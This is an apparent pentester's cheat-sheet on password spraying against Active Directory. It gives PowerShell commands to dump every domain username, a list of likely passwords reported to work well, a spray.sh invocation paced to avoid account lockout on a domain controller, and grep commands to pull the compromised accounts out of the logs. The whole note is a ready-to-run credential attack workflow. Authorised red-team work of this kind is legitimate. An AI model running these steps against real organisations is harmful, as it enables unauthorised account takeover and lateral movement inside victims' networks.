# Active Directory - Passwords spraying

Password spraying refers to the attack method that takes a large number of
usernames and attempts authentication with a limited number of likely passwords.

This method avoids accounts lockouts which is usually implemented on Active
Directory authentication.

Password spraying all domain users and attempting lateral or vertical movement
with the compromissed accounts is often more effective than targeting specific
users from the get-go.

### Usernames list

###### From domain controllers

To gather a list of usernames from the domain controllers a domain account is
needed.

The Get-ADUser cmdlet of the Powershell Active-Directory module can be used to
this end:

```
Get-ADUser -Filter *  | ft SamAccountName | Out-File <USERNAMES_FILE>
Get-ADUser -Server <DC> -Filter *  | ft SamAccountName | Out-File <USERNAMES_FILE>
```

To count the number of user in the domain:

```
cat <USERNAMES_FILE> | Measure-Object
```

For more details on possible options, refer to the Active Directory - Domain
Recon note.

###### LDAP Anonymous and NULL bind

Misconfigured LDAP servers may be exploited to leak the usernames of the domain
account.  

To detect and exploit LDAP Anonymous and NULL bind refer to the L7 - LDAP note.

### Passwords list

For the success of a password attack, a good password list is essential.

The passwords used must satisfied the password policy defined for the domain. To
retrieve the password policy enforced, refer to the Active Directory - Domain
Recon note.   

The following passwords have been tried with great success:

```
<COMPANY_NAME><YEAR>
<COMPANY_NAME><YEAR>!
Bonjour<YEAR>
Bonjour<YEAR>!
Azerty1234
Azerty1234!
```

### Spraying

Spray is a bash scrip that can be used to carry out Active Directory passwords
spraying.  

It can use the password policy of the domain as input to prevent accounts
lockout. To retrieve the password policy of the domain, refer to the Active
Directory - Domain Recon note.

```
spray.sh -smb <DC_IP> <USERNAMES_FILE> <PASSWORDS_FILE> <ATTEMPTS_PER_LOCKOUT_PERIOD> <LOCKOUT_PERIOD_IN_MINUTES> <DOMAIN>

# Example
spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 SPIDERLABS
```

To retrieve the obtained accounts:

```
grep 'Authority Name' logs/spray-logs.txt
grep -v NT_STATUS_LOGON_FAILURE logs/spray-logs.txt
```
